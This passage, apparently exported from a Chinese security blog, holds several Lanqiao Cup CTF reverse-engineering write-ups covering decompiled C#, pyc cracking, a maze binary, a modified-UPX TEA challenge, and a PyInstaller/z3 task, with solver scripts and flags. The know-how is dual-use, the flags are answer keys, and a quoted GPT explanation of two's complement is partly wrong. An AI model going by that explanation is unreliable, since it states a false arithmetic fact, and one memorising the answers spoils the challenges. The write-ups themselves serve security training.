如果之前未创建过，则创建一个用于将对象转换为Excel工作表的调用站点。 5. 将第一个工作表赋值给变量\"sheet1\"。 6. 创建一个Random实例。 7. 使用嵌套循环遍历一个48x48的二维数组。 8. 如果之前未创建过，则创建一个用于设置Excel单元格值的调用站点。 9. 将二维数组中的值设置到对应的单元格中。 基本上，这段代码在Excel中创建了一个48x48的表格，并将二维数组中的值填充到对应的单元格中。其他细节和上下文可能还需要更多信息才能完全理解代码的目的和功能。 1. 对工作表的区域\"A1\"到\"Y50\"进行水平居中对齐。 2. 绑定Excel工作表的\"SelectionChange\"事件，并将\"Select_Unit\"方法与之关联，以便在选择更改时触发该方法。 在\"Select_Unit\"方法中，具体含义如下： 1. 创建一个用于存储Excel单元格集合的列表。 2. 遍历目标单元格的集合，并将每个单元格作为Excel.Range对象添加到列表中。 3. 判断是否已经创建了一个用于判断条件是否为真的调用站点。 4. 检查目标单元格的计数是否等于2，将结果赋值给变量flag。 5. 声明一个obj2变量。 在上述代码中，根据变量 `flag` 的值进行条件判断。如果 `flag` 为真，则执行以下操作： 1. 检查之前是否已经创建了一个用于判断条件与的调用站点。 2. 获取列表中第一个单元格的值，并与 `null` 进行比较，使用调用站点的 `BinaryOperation` 方法进行比较操作。 3. 将比较的结果赋值给 `obj2`。 如果 `flag` 值为假，则将 `flag` 直接赋值给 `obj2`。 接下来，将 `obj2` 赋值给 `obj3`。 最后，根据条件判断创建一个用于判断条件是否为假的调用站点，并将结果赋值给 `obj4`。 在上述代码中，根据前面步骤得到的 `obj3` 的值进行判断。如果 `obj3` 不为假，则执行以下操作： 1. 检查之前是否已经创建了一个用于判断条件与的调用站点。 2. 获取列表中第二个单元格的值，并与 \"\\ud83d\\udca5\" 进行比较，使用调用站点的 `BinaryOperation` 方法进行比较操作。 3. 将比较的结果赋值给 `obj6`。 如果 `obj3` 值为假，则将 `obj3` 直接赋值给 `obj6`。 接下来，将 `obj6` 赋值给 `obj7`。 最后，根据条件判断创建一个用于判断条件是否为假的调用站点，并将结果赋值给 `obj7`。 接下来，根据条件判断创建一个用于判断条件与的调用站点，并将 `list[0].get_Value(Type.Missing)` 和 \"\\ud83d\\udca5\" 进行比较，使用调用站点的 `BinaryOperation` 方法进行比较操作。 如果为真，则执行以下操作： 1. 根据条件判断创建一个用于判断条件是否为真的调用站点，并将结果赋值给 `target6`。 2. 根据条件判断创建一个用于判断条件是否相等的调用站点。 3. 如果 `target6` 返回的结果为真，则执行以下操作： a. 创建一个整数数组，数组元素为 `Game.<>o__6.<>p__14.Target(Game.<>o__6.<>p__14, list[1].get_Value(Type.Missing))`，即将 `list[1].get_Value(Type.Missing)` 转换为整数数组。 b. 计算出一个整数 `num`。 c. 更新 `this.number[num]` 的值。 d. 将 `list[0].get_Value(Type.Missing)` 和 `list[1].get_Value(Type.Missing)` 的值均设置为 \"\\ud83d\\udca5\"。 最后，调用 `this.check()` 方法。 方法中使用两层嵌套的循环遍历一个大小为 48x48 的二维数组。在每个循环中，执行以下操作： 1. 根据条件判断创建一个用于判断条件是否为真的调用站点，并将结果赋值给 `target`。 2. 根据条件判断创建一个用于判断值是否和 \"\\ud83d\\udca5\" 不相等的调用站点，并将结果赋值给 `target2`。 3. 获取 `this.sheet1.Cells[i + 1, j + 1]` 的值，并使用调用站点的 `GetMember` 方法获取该值的 `\"Value\"` 属性的值。 4. 将获取的值与 \"\\ud83d\\udca5\" 进行比较。 5. 如果比较结果为真，则返回，结束方法的执行。 如果两层循环执行完毕后仍未返回，则在最后弹出一个对话框，显示根据 `this.number` 数组中的值转换而成的 ASCII 字符串。 此外，还定义了一些私有字段和属性。`app`、`wb`、`sheet1` 分别表示 `Microsoft.Office.Interop.Excel.Application`、`Microsoft.Office.Interop.Excel._Workbook` 和 `Microsoft.Office.Interop.Excel.Worksheet` 对象。`arr` 表示一个字符串数组，`number` 表示一个整数数组。 通过对代码的分析找到程序的执行逻辑，找到主要代码（只有这里有关于数组的计算操作）： 怀疑最后得到的this.number是最终的flag： if (target6(<>p__6, Game.<>o__6.<>p__12.Target(Game.<>o__6.<>p__12, list[0].get_Value(Type.Missing), list[1].get_Value(Type.Missing)))) { if (Game.<>o__6.<>p__14 == null) { Game.<>o__6.<>p__14 = CallSite>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(Game))); } int[] array = (from c in Game.<>o__6.<>p__14.Target(Game.<>o__6.<>p__14, list[1].get_Value(Type.Missing)) select (int)c).ToArray(); int num = (array[0] - 55296) * 1024 + array[1] - 56320 + 65536 - 128512; this.number[num] -= (list[1].Row - 1) * (list[1].Column - 1); this.number[num] -= (list[0].Row - 1) * (list[0].Column - 1); list[0].set_Value(Type.Missing, list[1].set_Value(Type.Missing, \"\\ud83d\\udca5\")); } 由代码解释不难看出，array就是上面的48*48数组，number也是，list[0]和list[1]的操作有点疑问，但是可以大胆猜测就是array数组，并且两个的值一样，所以this.number[num] -= (list[1].Row - 1) * (list[1].Column - 1);和this.number[num] -= (list[0].Row - 1) * (list[0].Column - 1);可以看成一句this.number[num] -= [array元素的行标] * [array元素的列标]。 所以写出解题exp： 首先进行数据整理 整理后数据 array = [] for i in range(48): array.append([0] * 48) '''数组太大放不下''' number = [ 25588, 31114, 28727, 26722, 24948, 25135, 25480, 29029, 23025, 25775, 15411, 25423, 25202, 30031, 27380, 30734, 25054, 25109, 20741, 28568, 28802, 24591, 26063, 30940, 30375, 19411, 29573, 20845, 27232, 26743, 25779, 24986, 31498, 30978, 22945, 26563, 35012, 29994, 27016, 29535, 21342, 26573, 27569, 25408, 31567, 25503, 21385, 27207] for i in range(48): for j in range(48): x = int(array[i][j][:4], 16) y = int(array[i][j][4:], 16) num = (x - 55296) * 1024 + y - 56320 + 65536 - 128512 number[num] -= i * j print(b'flag{' + bytes(number)[6:-6] + b'}') # b'flag{369d9412-f5c8-4aa4-8056-a7e4369d4555}' 得到flag{369d9412-f5c8-4aa4-8056-a7e4369d4555} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/findkey.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/findkey.html","title":"Findkey","keywords":"","body":"题目描述 FLAG就是你输入的key 解题 下载附件，用DIE打开查看文件信息， 可以看到是Python2.7下的文件，用winhex打开查看文件头： 与2.7版本的pyc文件头相同，是一个pyc文件，修改后缀，放入pyc在线编译网站在线pyc,pyo,python,py文件反编译，目前支持python1.5到3.6版本的反编译-在线工具 (bugscaner.com) 得到源代码： # -*- coding: utf8 -*- #! /usr/bin/env 2.7 (62211) #coding=utf-8 #source path: findkey #Compiled at: 2016-04-30 09:54:18 #Powered by BugScaner #http://tools.bugscaner.com/ #如果觉得不错,请分享给你朋友使用吧! import sys lookup = [ 196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139] pwda = [ 188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42] pwdb = [53, 222, 230, 35, 67, 248, 226, 216, 17, 209, 32, 2, 181, 200, 171, 60, 108] flag = raw_input('Input your Key:').strip() if len(flag) != 17: print 'Wrong Key!!' sys.exit(1) flag = flag[::-1] for i in range(0, len(flag)): if ord(flag[i]) + pwda[i] & 255 != lookup[i + pwdb[i]]: print 'Wrong Key!!' sys.exit(1) print 'Congratulations!!' 代码逻辑很清晰，直接编写解题脚本： lookup = [ 196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139] pwda = [ 188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42] pwdb = [53, 222, 230, 35, 67, 248, 226, 216, 17, 209, 32, 2, 181, 200, 171, 60, 108] flag = \"\" for i in range(0, 17): flag += chr(lookup[i + pwdb[i]] - pwda[i] & 255) print(flag[::-1]) # PCTF{PyC_Cr4ck3r} 得到PCTF{PyC_Cr4ck3r} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/map.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/map.html","title":"Map","keywords":"","body":"题目描述 小蓝同学发给你一个可执行文件，你运行后发现是一个简单的迷宫游 戏，你没有办法看到迷宫的全貌，只能通过键盘控制你的移动。你意识 到需要用逆向工具来分析它，看看是否能找到隐藏在其中的迷宫地图， 并且找出最短的移动路径。 解题 根据题目描述可以知道该题与迷宫有关，所以之后分析可以着重找到迷宫地图。 扔入exeinfope中查看基本信息：C语言编写的elf64位linux程序 放入64位的IDA中查看，找到main函数，按F5反汇编 可以看出flag是我们输入的字符串的32位小端（小端就是小写，大端就是大写）md5值，再根据题目描述猜测我们输入的m字符串就是走出迷宫的最短路径！！！ 分析程序，在switch语句中发现一个出现最多的函数checkPosition，双击进入 在其中发现一个mp数组双击进入发现就是我们需要的迷宫地图， 将mp数组全部选中，然后在编辑中找到导出数据可以根据需要快速导出数据，可以根据导出的数据用C语言（其他语言也可）编写脚本快速打印地图，此处还需注意由于mp数组第一行并未用16进制表示所以导出数据时并不会将其导出之后需自行加上脚本如下： #include #include #include int main(){ int map [] = {0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x6C, 0x69, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C, 0x69, 0x6C, 0x7C}; for (int i = 0; i 在加上第一行迷宫组成完整迷宫，在放在文本编辑器（Sublime Text或其它）中进行处理便于观察迷宫，可以看到il代表的是墙，li代表的是路，所以得到正确走出迷宫的路径：sddddssdddssddssds， 放入md5在线生成网站 得到flag{6cc4fc7f5f2127cae570b4337c3db20f} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/Poisoned_tea_CHELL.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/Poisoned_tea_CHELL.html","title":"Poisoned Tea CHELL","keywords":"","body":"题目描述 秘密喝茶室 解题 通过题目可以猜测该题与tea加密算法有关。拖入exeinfope，64为的elf文件，在kali中运行程序查看特征 ​ ，用IDA打开可以发现在字符串页面中没有程序运行特征，并且发现无主程序main，并且识别不了一些函数，怀疑有壳但是用UPX工具不能脱，查看其中的函数，在函数sub_5847中发现疑似Tea加密算法特征， sub_5763函数疑似解密算法特征， 继续追踪函数5847，发现在sub_597A中用了5847这函数， 分析函数，不难发现v11数组就是tea算法需要的key，v17就是解密的数据，但是v11和加密轮数这些重要数据都未识别到，那么可以采用动态调试的方式进行逆向，这里可以使用IDA自带的linux远程调试功能进行调试。 找到IDA的安装目录，进入dbgsrv目录下找到linux_server64位程序，将其放入kali中，并给其赋予执行权限，将题目也放入kali中赋予执行权限， 分别运行linux_server64和题目 ./linux_server64 -P kali -p 12345 # -P定义密码；-p定义端口号 ./Poisoned_Tea 在IDA中找到debugger，选择远程linux调试，填写相关路径信息， 设置好后确定再在debugger选项卡中选择Attach to process选择要调试的附加程序.\\Poisoned_Tea，开始调试 然后再kali运行的题目程序中选择选项二回车， 然后一直按F7单步步入，直到这个地方不能步入了（就是因为该函数不能被IDA识别），按P生成函数，然后再F5转换伪代码查看 这就是该程序完整的执行流程了（加了注释）， __int64 __fastcall sub_7F2210AC8536(__int64 a1, __int64 a2) { __int64 result; // rax int v3; // [rsp+8h] [rbp-468h] int i; // [rsp+Ch] [rbp-464h] int j; // [rsp+10h] [rbp-460h] int v6; // [rsp+14h] [rbp-45Ch] BYREF int v7; // [rsp+18h] [rbp-458h] int v8; // [rsp+1Ch] [rbp-454h] int v9[8]; // [rsp+20h] [rbp-450h] BYREF int v10; // [rsp+40h] [rbp-430h] int v11; // [rsp+44h] [rbp-42Ch] int v12; // [rsp+48h] [rbp-428h] int v13; // [rsp+4Ch] [rbp-424h] int v14; // [rsp+50h] [rbp-420h] int v15[258]; // [rsp+60h] [rbp-410h] BYREF unsigned __int64 v16; // [rsp+468h] [rbp-8h] v16 = __readfsqword(0x28u); v3 = 1; v9[0] = 5; v9[1] = 2; v9[2] = dword_7F2210ACB020; v9[3] = dword_7F2210ACB010; v9[4] = 0; memset(v15, 0, 0x400uLL); ((void (__fastcall *)(const char *, __int64, int *))unk_7F2210AC80E0)(\"##############\", a2, v15); ((void (__fastcall *)(const char *))unk_7F2210AC8110)(\"\\ninput flag: \"); ((void (__fastcall *)(void *, int *))unk_7F2210AC8150)(&unk_7F2210AC9025, v15); ((void (*)(void))unk_7F2210AC8130)(); v6 = 0; v7 = 0; v8 = 0; for ( i = 0; v15[i]; i += 2 ) //调用Tea加密程序对数据进行两字节两字节的加密 { v6 = v15[i]; v7 = v15[i + 1]; ((void (__fastcall *)(_QWORD, int *, int *))unk_7F2210AC8403)((unsigned int)dword_7F2210ACB030, &v6, v9); //Tea函数，有三个参数，第一个是算法执行迭代轮数，第二个参数是加密的数据，第三个是密钥key v15[i] = v6; v15[i + 1] = v7; } v10 = 0; v11 = 0; v12 = 0; v13 = 0; v14 = 0; for ( j = 0; v15[j]; j += 2 ) // 为验证程序，其中的dword_7F2210ACB1E0就是最后程序输出的数据，提取得到dword_7F2210ACB1E0[] = { 0xECFDA301, 0x61BECDF5, 0xB89E6C7D, 0xCE36DC68, 0x4B6E539E, 0x642EB504, 0x54F9D33C, 0x6D06E365, 0xEA873D53,0xA4618507, 0xD7B18E30, 0xC45B4042 } { v10 = dword_7F2210ACB1E0[j]; v11 = dword_7F2210ACB1E0[j + 1]; v12 = v15[j]; v13 = v15[j + 1]; if ( v10 != v12 || v11 != v13 ) { v3 = 0; break; } } if ( v3 ) ((void (__fastcall *)(const char *))unk_7F2210AC80E0)(\"Your input is correct.\"); else ((void (__fastcall *)(const char *))unk_7F2210AC80E0)(\"Your input is incorrect.\"); result = 0LL; if ( v16 != __readfsqword(0x28u) ) return ((__int64 (*)(void))unk_7F2210AC8100)(); return result; } 在其中可以看到完整的key和Tea加密轮数，拿出来分别是key = [ 5, 2, 9, 7 ]， 轮数是0x24也就是36 点击unk_7F2210AC8403函数也就是我们开始看到的Tea加密函数，进入，再按P生成函数并转为伪代码得到： __int64 __fastcall sub_7F2210AC8403(int a1, unsigned int *a2, __int64 a3) { __int64 result; // rax int i; // [rsp+24h] [rbp-14h] unsigned int v5; // [rsp+28h] [rbp-10h] unsigned int v6; // [rsp+2Ch] [rbp-Ch] unsigned int v7; // [rsp+30h] [rbp-8h] v5 = *a2; v6 = a2[1]; v7 = 0; for ( i = 0; i > 5) ^ (16 * v6))) ^ (*(_DWORD *)(4LL * (v7 & 3) + a3) + v7); v7 -= 1091584273; v6 += (v5 + ((v5 >> 5) ^ (16 * v5))) ^ (*(_DWORD *)(4LL * ((v7 >> 11) & 3) + a3) + v7); } *a2 = v5; result = v6; a2[1] = v6; return result; } 但是我们还发现一个问题，就是Tea算法在加密是使用的delte在加密时是一直累加而不是想该程序这样v7 -= 1091584273（v7 -= 0x41104111）一直减，但是在二进制运算中在某些情况下两个互为补码的数可以互转，也就是 v7 -= 0x41104111可以写成v7 += 0xBEEFBEEF（按位取反） 以下结果来自GPT 在某些情况下，v7 -= 0x41104111 和 v7 += 0xBEEFBEEF 是等效的，这是因为 -0x41104111 和 0xBEEFBEEF 是互为补数。 补数是一种表示负数的方式，计算器或计算机系统用它来执行负数的算术运算。补数分为两个类型：二进制补码和十进制补码。在计算机系统中，常用的是二进制补码。 在二进制补码中，正数的二进制表示保持不变，而负数通过将其正数的二进制表示反转（按位取反），然后再加1。这种表示方法使得计算机可以用相同的硬件逻辑执行正数和负数的加法和减法运算。 补数的性质之一是，两个补数相加得到的结果是一个全1的二进制数。也就是说，0x41104111 + 0xBEEFBEEF 的结果是一个全1的二进制数。 因此，v7 -= 0x41104111 和 v7 += 0xBEEFBEEF 对于某些变量 v7 来说是等效的。这是因为通过在 v7 上执行两个操作，都会改变 v7 的值，使其变得不同，但是最终结果会变成一个全1的二进制数。 需要注意的是，这种等效只存在于特定的情况下，其中涉及到补数的数值表示。在一般情况下，减法操作和加法操作是不等效的。 根据此，写出该Tea算法的解密程序： #include #include #include int main(){ uint32_t key[] = { 5, 2, 9, 7 }; uint32_t flag[] = { 0xECFDA301, 0x61BECDF5, 0xB89E6C7D, 0xCE36DC68, 0x4B6E539E, 0x642EB504, 0x54F9D33C, 0x6D06E365, 0xEA873D53,0xA4618507, 0xD7B18E30, 0xC45B4042 }; uint32_t x = 0; uint32_t y = 0; uint32_t delta = 0xbeefbeef; //0x41104111 uint32_t sum = delta * 36; for(int i = 0; i > 5) ^ (16 * x))) ^ (*(((sum >> 11) & 3) + key) + sum); sum -= delta; x -= (y + ((y >> 5) ^ (16 * y))) ^ (*((sum & 3) + key) + sum); } flag[i] = x; flag[i + 1] = y; } printf(\"%s\", flag); return 0; } // Thisisflag{cdfec405-3f4b-457e-92fe-f6446098ee2e} 得到flag{cdfec405-3f4b-457e-92fe-f6446098ee2e} 其中的flag数组是在静态调试时获取到的dword_7F2210ACB1E0，一共12个数据； 补充 在本解法最后一步中得到的数据有些问题，在动态调试时发现dword_7F2210ACB1E0数组并不是12个，在文章开头时猜测过本题有壳但是用exeinfope查询不出就此作罢，但是在用另一个工具die时发现了UPX壳，用wenhex打开 确实很符合修改过UPX壳特征的痕迹，将VMP全部替换成UPX（注意大写）后，发现确实可以用upx工具进行脱壳了，脱壳后脱如IDA中得到的代码很完整： 其中的验证数据也很完整，但是在与动态调试时获取到的数据不一样，应该是程序在运行过程中进行了修改（太狗了），所以就算是脱壳后也要进行远程动态调试； 还有一种解法是不用脱壳直接将程序拖入IDA中进行手动定义函数： 在IDA上方的内存分布中可以在函数区段发现4个红区，这就是IDA未成功识别函数的位置，直接鼠标移到此处，点击进入 可以看到4个奇怪数据，将鼠标点击763位置按u键取消定义，在按p生成函数 变成这样 其他三个地方同理，修复完成后重新加载即可得到相对完整数据（没成功），当然程序运行时该改的值还是会改，所以三种方法不变的是都需要进行动态调试，不一样的地方只是开始拿到题目对题目进行的初步处理不一样。 还有就是发现IDA提取数据时只会单字节提取，但是这个题目要求对长整型进行数据处理，需要注意。 这就是为什么之前写的题目XOR会出现字符串倒转的情况 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/Pytrans.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/Pytrans.html","title":"Pytrans","keywords":"","body":"题目描述 pytrans最近又get了一个python知识点，但是当他深入学习的时候发现 自己迷失了方向，你能帮他走出来并且拿到flag吗? 解题 下载附件是一个elf文件，根据题目描述猜测应该是pythonpip打包的elf文件，用pyinstxtractor反编译工具来反编译出源文件： 查看提取到的文件 可以看到两个主程序run.pyc和struct.pyc，用uncompyle6将其进行反编译成py文件,注意uncompyle6的版本应当与文件使用的python版本一致，通过文件我们可以知道该题目用的是python3.8。 由于linux安装多版本python比较复杂，所以uncompyle6命令我是在windows系统下使用，python3.8安装在windows下也很简单，只要在安装时不要选添加到环境变量即可，后续安装python3.8后使用该版本的pip只要找到python3.8的主目录下的Script下通过cmd命令再用pip命令即可： .\\uncompyle6.exe -o run.py[的文件路径] run.pyc[的文件路径] .\\uncompyle6.exe -o struct.py[的文件路径] struct.pyc[的文件路径] Warning警告不用管，这样uncompyle6库就安装成功，使用的话也是同理，在该目录下使用上面的命令就行 反编译好后再讲得到的文件拉回到kali，（pyinstxtractor.py该工具也可以在windows下使用），由于该题目是一个elf文件，所以就算是提取出来的也都是elf的linux文件，所以在linux环境中才能运行。 查看run.py源代码： 可以看到流程是先让我们输入10个数，以回车结尾，再调取mylib.so文件里的check函数，对我们输入的值进行操作，那下一步就是分析文件中的mylib.so文件，将其放入IDA中： 可以看到check函数的代码是将我们输入的10个值进行操作在当做if语句做判断条件a1数组就是我们输入的10个值，直接通过该函数的几个条件想要求解这10无疑是异常困难的，那么接下来我就有要是用一个CTF逆向中有一个非常重要的工具z3库， Z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域中，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。 详细用法就不展开讲，感兴趣自己去搜索，直接给出代码：注意IDA中的*a1就是值得a1数组起始地址，也就是a1[0] from z3 import * a1 = [BitVec('a%d' % i, 16) for i in range(10)] solver = Solver() solver.add(-27 * a1[7] + -11 * a1[6] + 16 * a1[5] + a1[0] + 2 * a1[1] - a1[2] + 8 * a1[3] - 14 * a1[4] + 26 * a1[8] + 17 * a1[9] == 14462) solver.add(-30 * a1[8] + 13 * a1[5] + a1[3] + a1[1] + 2 * a1[0] - 15 * a1[4] - 24 * a1[6] + 16 * a1[7] + 36 * a1[9] == -2591) solver.add(16 * a1[6] + -21 * a1[5] + 7 * a1[3] + 3 * a1[1] - a1[0] - a1[2] + 12 * a1[4] - 23 * a1[7] + 25 * a1[8] - 18 * a1[9] == 2517) solver.add(-6 * a1[6] + 2 * a1[2] - a1[1] + 2 * a1[5] + 9 * a1[7] + 2 * a1[8] - 5 * a1[9] == 203) solver.add(-5 * a1[8] + 6 * a1[7] + 3 * a1[1] - a1[3] - a1[5] + a1[6] + 5 * a1[9] == 3547) solver.add(-9 * a1[8] + a1[4] + a1[2] + a1[7] - 5 * a1[9] == -7609) solver.add(2 * a1[5] + -a1[3] - a1[4] + a1[8] + 6 * a1[9] == 4884) solver.add(a1[6] - a1[7] + 2 * a1[8] == 1618) solver.add(a1[4] - a1[6] + 2 * a1[9] == 1096) solver.add(a1[8] + a1[4] + a1[3] + a1[2] + a1[1] + a1[0] - a1[5] - a1[6] - a1[7] - a1[9] == 711) solver.add(2 * (2 * a1[4] + a1[3]) + 5 * a1[5] == 7151) if solver.check() == sat: num = solver.model() print(num) ''' [a6 = 897, a7 = 575, a9 = 738, a5 = 637, a3 = 949, a0 = 511, a1 = 112, a2 = 821, a4 = 517, a8 = 648] ''' 运行后得到10个数，按照循序排列，得到程序要求输入的10个数：a1 = 511 112 821 949 517 637 897 575 648 738，将这10个数放入程序中运行，发现后面还要求输入： 返回查看源代码，可以看到还有后面部分将我们输入的10个值进行一系列操作后，进行base64编码，再进行zlib压缩得到uncompressed_data，我们不用管编码什么，直接编辑run.py输出最后的uncompressed_data数据， 可以看到用字符输出确实有些信息， 再次编辑run.py代码，让其以winhex格式一字节一字节的16进制输出，并以ASCII 